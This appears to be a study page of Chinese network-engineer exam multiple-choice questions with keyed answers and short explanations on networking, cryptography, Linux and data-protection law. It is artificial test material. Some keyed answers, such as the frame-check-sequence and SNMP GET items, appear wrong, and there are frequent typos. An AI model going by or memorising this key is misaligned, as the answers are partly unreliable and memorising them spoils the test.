alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>将模拟型号转为数据信号时，为保证采样后的数字信号完整，采样频率必须大于或等于最大频率的（）。</li></ol><p>A.四倍<br>B.三倍<br>C.两倍<br>D.一倍</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512201835014.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><p>11.12. 在局域网中使用DHCP服务器为客户端分配IP地址的优点不包括（），客户端采用（）方式发送DHCP Discover报文，以查找网络中的DHCP服务器。</p><p>A.减少网络管理员工作量<br>B.提高IP地址使用效率<br>C.降低地址重复分配可能<br>D.提高网络传输效率<br>A.广播<br>B.单播<br>C.任意播<br>D.组播</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512202008021.png" alt="img"></p><blockquote><p>答：D,A</p></blockquote><ul><li><ol><li>下列（）协议可以加密传输电子邮件。</li></ol><p>A.SMTP (简单邮件传输邮件，明文发送邮件)<br>B.SSL<br>C.POP3 （邮局协议第三版，用于接收邮件）<br>D.IMAP （POP3的替代版本，所以对邮件的操作都会反馈到邮件服务器上）</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>DES加密算法对输入的明文首先进行（）。</li></ol><p>A.乘法运算<br>B.左右分离<br>C.初始置换<br>D.迭代运算</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512202420231.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>RSA加密算法的安全性依赖于()困难性假设。</li></ol><p>A.椭圆曲线离散对数<br>B.二次剩余<br>C.离散IS数<br>D.大素数分解</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512202542212.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>Telenet服务可以利用（）加密协议来保护传输安全。</li></ol><p>A.none<br>B.TLS<br>C.WPA2 (无线加密)<br>D.IPSec （网络层隧道协议）</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>根据《中华人民共和国个人信息保护法》，个人信息处理者在（）时，不需要事前进行个人信息保护影响评估并对处理情况进行记录。</li></ol><p>A.进行对个人权益有重大影响的个人信息处理活动。<br>B.向境外提供个人信息<br>C.利用匿名化的个人信息进行数据统计<br>D.处理敏感个人信息</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512202816892.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>根据《中华人民共和国数据安全法》，各地区、各部门应当按照数据（）制度，确认本地区、本部门以及相关行业、领域的重要数据具体目录，对列入目录的数据进行重点保护。</li></ol><p>A.分类分级保护<br>B.谁收集谁负责<br>C.谁公开谁负责<br>D.安全监管协调</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512203111653.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列WAP无线加密技术的说法中错误的是（）。</li></ol><p>A.WAP可以防止重放攻击<br>B.WAP使用802.1X协议对用户的MAC地址进行认证<br>C.WAP的初始向量长度为32位 (48位)<br>D.WAP无线加密方案包含了认证、加密和数据完整性校验</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512203203506.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><p>20.21下列选项中属于Linux防火墙工具的是（），使用（）配置可以实现禁止10.0.1.1网段使用ssh登录该服务器，且不做响应。</p><p>A.router<br>B.umount<br>C.acl<br>D.iptables<br>A.-AINPUT -s 10.0.1.1&#x2F;24 -ptcp -mtcp –dport 22 -j REJECT （拒绝并返回消息）<br>B.-AINPUT -s 10.0.1.1&#x2F;32 -ptcp -mtcp –dport 22 -j DROP<br>C.-AINPUT -s 10.0.1.1&#x2F;32 -ptcp -mtcp –dport 22 -j REJECT<br>D.-AINPUT -s 10.0.1.1&#x2F;24 -ptcp -mtcp –dport 22 -j DROP （拒绝不返回）</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>TCP协议与UDP协议工作在（）。</li></ol><p>A.传输层<br>B.网络层<br>C.物理层<br>D.数据链路层</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512203726664.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在域名解析过程中，通常主机会首先查找（）。</li></ol><p>A.转发域名服务器<br>B.辅助域名服务器<br>C.缓存域名服务器<br>D.主域名服务器</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512203827085.png" alt="img"></p><blockquote><p>答：C</p></blockquote><blockquote><p>解析：C -&gt; D -&gt; A -&gt; B</p></blockquote><ul><li><ol><li>下列关于自治系统（AS）的描述中正确的是（）。</li></ol><p>A.自治系统是一个由互联的计算机组成的局域网<br>B.自治系统是一个独立的网络管理实体，有多个互联的计算机组成。<br>C.自治系统是一个独立的网络管理实体，有一组IP地址及相关路由策略组成<br>D.自治系统是一个唯一的IP地址块，有一个网络运营商管理</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>拥塞控制的最终目标是（）。</li></ol><p>A.防止过多数据注入网络<br>B.最大化利用带宽率<br>C.最小化延迟<br>D.最小化丢包率</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在Windows下，可以在开始菜单的“运行”窗口中键入（）命令，可运行Microsoft管理控制台。</li></ol><p>A.AUTOEXE<br>B.MMC<br>C.CMD<br>D.TTY</p></li></ul><blockquote><p>答：MMC</p></blockquote><ul><li><ol><li>在HTTPS请求中，（）用于指定请求的内容类型。</li></ol><p>A.Cache-Control<br>B.Content-Type<br>C.if-Modified-Since (浏览器缓存记录该文件的最后服务器修改时间,对比服务器和本地缓存的文件时间)<br>D.Expires （失效日期）</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下拉关于RIP协议的描述不正确的是（）。</li></ol><p>A.网络拓扑更改时，均需要更新路由表<br>B.网络出现故障时，会出现慢收敛现象，俗称“坏消息传得慢”<br>C.限制了网络的规模，它能使用的最大距离为15（16表示不可达）<br>D.路由器之间需要交换完整路由表，网络规模越大、开销越大</p></li></ul><blockquote><p>答：A （30S自动更新 ）</p></blockquote><ul><li><ol><li>RIP协议在更新和维护路由信息时主要用四个定时器，（）超时，立即发出更新报文</li></ol><p>A.Update timer<br>B.Age timer<br>C.Garbage-collecttimer<br>D.Suppress timer</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512204734662.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在Linux系统中，使用Apache作为Web服务器时默认的目录是（）。</li></ol><p>A.&#x2F;etc&#x2F;httpd<br>B.&#x2F;etc&#x2F;home<br>C.&#x2F;var&#x2F;log&#x2F;httpd<br>D.&#x2F;home&#x2F;httpd</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>关于VLAN说法错误的是（）。</li></ol><p>A.缺省的VLAN名是系统根据VLANID自动生成的<br>B.每一个VLAN是一个独立的广播域<br>C.VLAN工作在OSI参考模型的第二层<br>D.IEEE802.1Q标准规定，用于标识VLAN的VLANID用10bit</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列IP地址（）不属于子网172.16.24.0&#x2F;24</li></ol><p>A.172.16.28.12<br>B.172.16.30.4<br>C.172.16.32.56<br>D.172.16.26.251</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><p>33.34 在IPv4地址段 10.20.30.0&#x2F;24中，划分至少3个子网，其主机为数是（）为，其子网掩码是（）。</p><p>A.7<br>B.8<br>C.5<br>D.6<br>A.255.255.255.224<br>B.255.255.255.128<br>C.255.255.255.192<br>D.255.255.255.0</p></li></ul><blockquote><p>答：A,B</p></blockquote><ul><li><ol><li>IPv6地址通常以十六进制数字表示，4个数字为一组用冒号分隔，下面对IPv6地址FE80:0000:0000:0000:004B:EA00:008E:D426正确的简化写法是（）。</li></ol><p>A.FE80::4B:EA::8E:D426<br>B.FE80::004B:EA00:008E:D426<br>C.FE8::4B:EA00:8E:D426<br>D.FE80::4B:EA00:8E:D426</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512205647692.png" alt="img"></p><blockquote><p>答： D</p></blockquote><blockquote><p>解析：使用双冒号表示几组零，双冒号只能用一次；签名的零可以省略，后面和中间的不可以省略；</p></blockquote><ul><li><p>36.37. 下面地址中，可以作为网络地址的是（），其对应的子网掩码是（）。</p><p>A.172.16.36.0&#x2F;19<br>B.192.168.0.191&#x2F;27<br>C.172.20.96.0&#x2F;19<br>D.192.168.0.36&#x2F;27<br>A.255.255.255.128<br>B.255.255.128.0<br>C.255.255.255.0<br>D.255.255.224.0</p></li></ul><blockquote><p>答：C,D</p></blockquote><ul><li><ol><li>以下不属于光纤通信的特点是（）。</li></ol><p>A.传输损耗小，中继距离长，对远距离传输特别经济<br>B.在有效距离内，设备无需对准某个方向，就能进行通信 （无线的特点）<br>C.抗雷电和电磁干扰性能好，在有大电流脉冲干扰的环境下通信效果良好<br>D.无串音干扰，保密性好，也不易被窃听或截取数据</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>系统维护的功能不包括（）。</li></ol><p>A.清除异常任务<br>B.定期更换CPU<br>C.更新口令<br>D.数据备份</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>VxLAN与QinQ相比，说法错误的是（）。</li></ol><p>A.通过MAC-in-DUP封装数据包<br>B.技术更昂贵，更复杂，不是所有交换机都支持<br>C.其工作层具有更高的可扩展性，适应云计算机要求<br>D.增加VLANID数量</p></li></ul><blockquote><p>答：D</p></blockquote><blockquote><p>解析：VXLAN将报文封装到UDP，VNI（24位）唯一标识广播域；</p></blockquote><ul><li><ol><li>当（）时不应该发送ICMP差错报文。</li></ol><p>A.参数问题，路由器或目的主机收到的数据报的首部少有的字段的值不正确<br>B.组播报文，报文从一个源发出，被转发到一组特定的接受<br>C.改变路由（重定向），路由器改变了路由报文<br>D.终点不可达，路由器或主机不能交付数据报</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512210640099.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列路由协议中属于外部网关协议（EGP）的是（）。</li></ol><p>A.BGP<br>B.RIP<br>C.IS-IS<br>D.OSPF</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512210941736.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>关于BGP协议描述不正确的是（）。</li></ol><p>A.BGP协议是基于TCP的路由协议<br>B.BGP协议计算路由的过程会暴露AS内部的网络拓扑<br>C.BGP协议用于实现不同AS之间的路由可达<br>D.BGP是一种矢量路由协议，在设计上就避免了环路的发生</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>PON网络中的OLT是什么（）的简称。</li></ol><p>A.光网络终端<br>B.光线路终端<br>C.光线路接入<br>D.光网络接入</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512211209467.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列网络工程师项目需求管理应遵循的原则中，不正确的是（）。</li></ol><p>A.需求要有文档记录<br>B.需求要分优先级<br>C.需求变更不需要评估<br>D.需求要分类管理</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在DNS服务器中，名字服务器及其优先级由（）资源记录定义。</li></ol><p>A.PRT (A记录的逆记录)<br>B.MX<br>C.CNAME （别名记录，就是主机有多个别名）<br>D.NS</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512211443025.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>POP3协议采用（）模式为用户服务。</li></ol><p>A.B&#x2F;S<br>B.C&#x2F;S<br>C.P2S<br>D.P2P</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512211543918.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>CSMA&#x2F;CD的具体作用是（）。</li></ol><p>A.用于检查网络连接的状态<br>B.用于检测网络中的冲突和碰撞<br>C.永远检测网络带宽的利用率<br>D.用于检查数据包的完整性</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512211639665.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>我国拥有自主知识产权的4G标准是（）。</li></ol><p>A.FDD-LTE (4G，非我国)<br>B.TD-SCDMA （3G,我国）<br>C.WCDMA (3G)<br>D.TD-LTE-Advanced</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>以下不属于5G网络有优点的是（）。</li></ol><p>A.引入了网络切片技术，允许将物理网络划分为多个虚拟网络<br>B.更好的安全性，采用更强大的加密和身份认证技术<br>C.传输过程中消耗的资源少，对设备的电池更友好<br>D.支持大规模物联网，能够连接大量低功耗设备，提供更高效的管理</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>WiFi6的传输速率可以达到（）</li></ol><p>A.5Gbps<br>B.1Gbps<br>C.9.6Gbps<br>D.2Gbps</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512212012848.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在局域网中未防止网络环路，应在交换机中配置（）。</li></ol><p>A.DNS(Domain Nname System)<br>B.STP(Spanning Tree Protocol)<br>C.RIP(Routing Information Protocol)<br>D.DHCP(Dynamic Hos tConfiguration Protocol)</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>数据链路层的帧结构中，帧检验序列的作用是（）。</li></ol><p>A.保证数据的完整性和准确性<br>B.标识数据段的起始和结束<br>C.实现数据的安全加密<br>D.提供数据的可靠传输</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在Windows中，可以使用（）浏览日志文件。</li></ol><p>A.信息服务 (IIS，用于发布网站)<br>B.浏览器<br>C.事件查看器<br>D.超级终端 （串口工具）</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列层次化网络设计的说正确的是（）。</li></ol><p>A.核心层作为流量汇聚处，应设计数据包过滤功能，提供可管理性<br>B.接入层实现用户接入和策略路由等功能<br>C.汇聚层向核心层进行路由宣告时一般不做子网聚合<br>D.一般设计3个层次即可，过多的层次会减低网络整体性能</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512212458501.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>SNMP协议中使用（）协议进行通信。</li></ol><p>A.TCP<br>B.IP<br>C.ICMP<br>D.UDP</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512212744985.png" alt="img"></p><blockquote><p>答：UDP</p></blockquote><ul><li><ol><li>SNMP协议中，Trap消息用于（）。</li></ol><p>A.向网络中的所有设备发送广播消息<br>B.向指定的设备发送消息<br>C.从设备中获取有关网络事件的信息<br>D.主动通知管理者有关网络事件的发生</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512212841624.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512212858075.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在SNMP协议中，（）操作可以用于获取MIB中的信息。</li></ol><p>A.GET<br>B.GET-RESPONSE<br>C.TRAP<br>D.GET-NEXT</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列工具中可以对Web表单进行暴力破解的是（）。</li></ol><p>A.Wireshark （抓包）<br>B.SQLMap （SQL注入）<br>C.Nmap （端口扫描工具）<br>D.BurpSuite （攻击Web工具的攻击平台）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512213215095.png" alt="BurpSuite模块"></p><p>BurpSuite模块</p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列关于PPPoE协议的说法正确的是（）。</li></ol><p>A.是一种点对点协议<br>B.不能提供身份验证<br>C.为用户分配公网IP地址<br>D.在局域网内使用PPP连接</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>当VLAN数据帧通过trunk链路转发时加入的802.1q标识位于原始以太网帧的（）。</li></ol><p>A.TYPE后<br>B.源MAC地址后<br>C.FCS前<br>D.目的MAC地址后</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512213720400.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>netstat命令中（）选项可以用于显示网络接口的IP地址和MAC地址。</li></ol><p>A.-i<br>B.-a<br>C.-e<br>D.-n</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512213847386.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下面关于卫星通讯的说法，错误的是（）。</li></ol><p>A.通讯费用高、延时较大时卫星通信的不足之处<br>B.使用卫星通信易于实现广播通信和多址通信<br>C.卫星通信的距离长，覆盖的范围广<br>D.卫星通信的好处在于不受气候的影响，误码率低</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在交换机上执行 display multicast fowarding-table命令作用是（）。</li></ol><p>A.查看二层组播转发表信息 display l2-multicast forwarding-table<br>B.查看组播转发表信息<br>C.查看IP组播路由表信息 display multicast routing-table<br>D.查看组播组的成员端口信息 display igmp-snooping port-info</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列AC+FIT AP无线组网的说法中错误的是（）。</li></ol><p>A.FIT AP为无线接入终端提供DHCP服务 （AC）<br>B.可为无线接入端提供跨AP的L2和L3漫游<br>C.适合大中规模网络应用场景<br>D.AC通过CAPWAP隧道与AP建立连接并统一管理</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512214457497.png" alt="img"></p><blockquote><p>答：A</p></blockquote><blockquote><p>解析：FAT AP是胖AP</p></blockquote><ul><li><ol><li>在Linux系统将所有的外部设备均作为文件统一进行管理，默认情况下，外部设备文件的目录是的（）。</li></ol><p>A.&#x2F;lib<br>B.&#x2F;etc<br>C.&#x2F;dev<br>D.&#x2F;bin</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在交接机上执行dispaly this interface 命令，CRC错包呈现出不断上涨的趋势，可以初步排除的（）。</li></ol><p>A.电磁干扰（CRC一般是链路有问题了）<br>B.病毒工具<br>C.物理链路故障<br>D.端口状态异常</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>若在光纤通信系统中使用100mw的激光器，当其发射波长为1550nm时，其光功率为（）。</li></ol><p>A.20dBM<br>B.10dBM<br>C.10dBM<br>D.30dBM</p></li></ul><blockquote><p>答：B</p></blockquote><blockquote><p>解析：dBm&#x3D;10xlg(x&#x2F;mw)</p></blockquote><ul><li><ol><li>下列关于干线子系统的说法中错误的是（）。</li></ol><p>A.干线子系统是建筑物的垂直主干线缆<br>B.大楼施工时应为干线子系统预埋暗管<br>C.干线子系统连接大楼的设备间和各楼层的配线间<br>D.干线子系统通常采用光纤作为传输介质</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512215024110.png" alt="img"></p><blockquote><p>答：B</p></blockquote><blockquote><p>解析：垂直干线子系统，弱电井；水平子系统，预埋暗管；</p></blockquote><ul><li><ol><li>SYN泛洪攻击主要利用的是TCP协议的（）过程。</li></ol><p>A.连接建立<br>B.序列号校验<br>C.连接释放<br>D.数据传输</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512215306066.png" alt="img"></p><blockquote><p>答：A</p></blockquote><hr><h2 id="2023年11月"><a href="#2023年11月" class="headerlink" title="2023年11月"></a>2023年11月</h2><ul><li><ol><li>当计算机突然断电时，（）中存储的信息会对数。</li></ol><p>A.光盘<br>B.ROM<br>C.RAM<br>D.硬盘</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512215553315.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>进程的状态有就绪态、运行态、阻塞态，其中（）的变化是不可能直接发生的。</li></ol><p>A.就绪态到运行态<br>B.阻塞态到就绪态<br>C.运行态到阻塞态<br>D.阻塞态到运行态</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512215842091.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>分布式存储系统规划时至少要设计（）个节点。</li></ol><p>A.5<br>B.4<br>C.3<br>D.2</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513204824932.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在CPU和主存之间设计Cache的目的是（）。</li></ol><p>A.增大主存的带宽<br>B.扩容主存容量<br>C.提升CPU访问主存的效率<br>D.提升DMS访问主存的效率</p></li></ul><blockquote><p>答：C</p></blockquote><blockquote><p>解析：局部性原理：时间局部性(for循环)，空间局部性(顺序)，预测要执行的指令，加载到内存中；cache可以增加命中概率（90%），提升CPU访问内存的效率。</p></blockquote><ul><li><ol><li>计算机的三大总线不包括（）。</li></ol><p>A.数据总线<br>B.通信总线<br>C.地址总线<br>D.控制总线</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513205716367.png" alt="img"></p><blockquote><p>答：B</p></blockquote><blockquote><p>解析：数据总线是双向的，地址总线是单向的，控制总线是双向的（设备可以向计算机发送中断请求）。</p></blockquote><ul><li><ol><li>Ping命令中的TTL（Time to Live）字段用于（）。</li></ol><p>A.测量网络延迟<br>B.识别主机的操作系统类型<br>C.控制数据包的生存时间<br>D.检测网络环路</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513210018249.png" alt="img"></p><blockquote><p>答：C</p></blockquote><blockquote><p>解析：TTL最大255, 初始值：win7 64, win10 128, unix 255, linux 64;</p></blockquote><ul><li><ol><li>在EIGRP协议中，某个路由器收到了两条路径到达目标网络，路径1的带宽为100Mbps，延迟2ms，路径2的带宽为50Mbps，延迟为4ms，如果EIGRP使用带宽和延迟的综合度量标准，那么该路由器选择的最佳路径是（）。</li></ol><p>A.路径1和路径2的平均值<br>B.路径2<br>C.路径1和路径2的和<br>D.路径1</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513210248518.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在5G技术中，（）特性运行多个设备同时连接到网络并获得高速数据传输。</li></ol><p>A.网络切片<br>B.大规模多输入输出 MIMO<br>C.正交频分多址 OFDMA<br>D.波速成形</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>网络系统的维护问题最早应在（）阶段提出。</li></ol><p>A.可行性分析<br>B.需求分析<br>C.概要设计<br>D.系统测试</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513211842028.png" alt="img"></p><blockquote><p>答：B</p></blockquote><blockquote><p>解析：五阶段法，</p></blockquote><ul><li><ol><li>在Linux系统中，硬盘、U盘等由文件系统管理的设备属于（）。</li></ol><p>A.字符设备<br>B.网络设备<br>C.虚拟机设备<br>D.块设备</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513212351700.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>一个进程被唤醒，意味着该进程（）。</li></ol><p>A.占有了CPU<br>B.变成了就绪态<br>C.优先级最大<br>D.资源不可访问</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513212425072.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列关于HTTP和HTTPS的说法错误的是（）。</li></ol><p>A.HTTPS响应速度比HTTP更快<br>B.HTTPS需要SSL证书<br>C.HTTP是明文传输<br>D.两者都属于TCP连接</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513212610050.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在OSI模型中，TCP协议对应的是（）。</li></ol><p>A.物理层<br>B.数据链路层<br>C.传输层<br>D.网络层</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513212724926.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列认证协议中，基于MD5哈希密码的挑战-响应机制进行身份验证的是（）。</li></ol><p>A.NTLM NT局域网管理器<br>B.MS-CHAP微软调整-握手认证协议<br>C.CHAP调整-握手认证协议<br>D.PAP密码认证协议</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513212906192.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>当一封电子邮件发送失败时（）。</li></ol><p>A.邮件系统会删除邮件并返回无法送达原因<br>B.邮件系统会一直投递直至送达<br>C.邮件系统会退回邮件但无法给出不能送达的原因<br>D.邮件系统会退回邮件并给出无法送达的原因</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列关于VLAN分隔网络的说法中，错误的是（）。</li></ol><p>A.抑制广播<br>B.物理隔离<br>C.设计具有灵活性<br>D.简化网络管理</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>关于VLAN说法错误的是（）。</li></ol><p>A.按连接到交换机设备的MAC地址定义VLAN成员是一种动态VLAN.<br>B.VLAN的划分不受用户所在的物理位置和物理网段的限制。<br>C.VLAN以交换机式网络为基础。<br>D.在VLAN ID标准范围内，可用于Ethernet的VLAN ID为10~1000. (1-1000)</p></li></ul><blockquote><p>答：D</p></blockquote><blockquote><p>解析：1-4094可用；划分标准1 1-1005标准，1006-1024保留，1025-4094扩展范围；以太网1-1000，令牌环网FDDI1002~1005;</p></blockquote><ul><li><ol><li>（）技术可以实现两层VLAN标签封装，专用网络的内部标签和公共网络的外部标签。</li></ol><p>A.VxLAN （隧道技术，在三层网络技术上建立二层的网络隧道，通过UDP封装）<br>B.Untag VLAN<br>C.VLAN-TAG<br>D.QinQ</p></li></ul><blockquote><p>答：D</p></blockquote><blockquote><p>解析：QinQ,用户报文在进入运营商前，再加一层外部标签，4094 x 4094</p></blockquote><ul><li><ol><li>PON系统组成包括光线路终端（OLT）、光分配网络（ODN）和（）三大部分。</li></ol><p>A.OBD<br>B.ONU<br>C.OTN<br>D.ODF</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513214015606.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>可以使用（）命令显示Linux系统当前用户的工作目录。</li></ol><p>A.#rd<br>B.#where<br>C.#pwd<br>D.#md</p></li></ul><blockquote><p>答：c</p></blockquote><ul><li><ol><li>可以使用（）命令在Linux系统中更改一个文件的权限设置。</li></ol><p>A.attrib<br>B.change<br>C.chmod<br>D.file</p></li></ul><blockquote><p>答：c</p></blockquote><ul><li><ol><li>根据Kerckhoffs原则，密码系统的安全性主要依赖于（）。</li></ol><p>A.解密算法<br>B.通信双方<br>C.加密算法<br>D.密钥</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513214226255.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>（）使用了与BGP协议类似的路径矢量算法来选择最佳路径。</li></ol><p>A.OSPF开发最短路径优先<br>B.IS-IS中间系统到中间系统<br>C.RIP路由信息协议<br>D.EIGRP增强型内部网关路由协议</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513214303706.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513214318756.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>可以显示当前TCP&#x2F;IP网络连接的情况和有关统计信息的命令是（）。</li></ol><p>A.ipconfig<br>B.tarcert<br>C.ping<br>D.netstat</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513214628329.png" alt="Windows网络配置命令"></p><p>Windows网络配置命令</p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>结构化综合布线设计中，工作区子系统的信息插座应距离地面（）。</li></ol><p>A.5cm<br>B.30cm<br>C.15cm<br>D.60cm</p></li></ul><blockquote><p>答：B，推荐30-50m</p></blockquote><ul><li><ol><li>下列IP地址中属于网络号的是（）。</li></ol><p>A.192.16.10.126&#x2F;26<br>B.10.0.2.160&#x2F;24<br>C.172.16.26.0&#x2F;23<br>D.192.168.5.128&#x2F;22</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在IPv6地址中，全球单播地址的前缀是（）。</li></ol><p>A.FE00::&#x2F;12<br>B.FE::&#x2F;10<br>C.2000::&#x2F;3<br>D.FFFF::&#x2F;10</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513214955818.png" alt="img"></p><blockquote><p>答：C</p></blockquote><blockquote><p>解析：0010~0011 -&gt; 2000:0XXX ~ 3FFF:FXXX</p></blockquote><ul><li><ol><li>IEEE802.11标准规定AP需要周期性地发送包含SSID和MAC地址的帧是（）。</li></ol><p>A.控制帧<br>B.数据帧<br>C.响应帧<br>D.信标帧</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250513215124325.png" 